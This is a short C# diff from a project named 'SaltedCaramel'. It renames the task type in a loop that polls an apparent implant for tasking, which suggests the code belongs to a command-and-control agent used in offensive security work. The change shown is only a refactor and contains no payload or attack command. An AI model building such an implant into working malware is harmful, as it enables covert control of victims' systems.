@@ -37,7 +37,7 @@ namespace SaltedCaramel
                 int shortId = 1;
                 while (true)
                 {
-                    SCTaskObject task = implant.CheckTasking();
+                    SCTask task = implant.CheckTasking();
                     if (task.command != "none")
                     {
                         task.shortId = shortId;
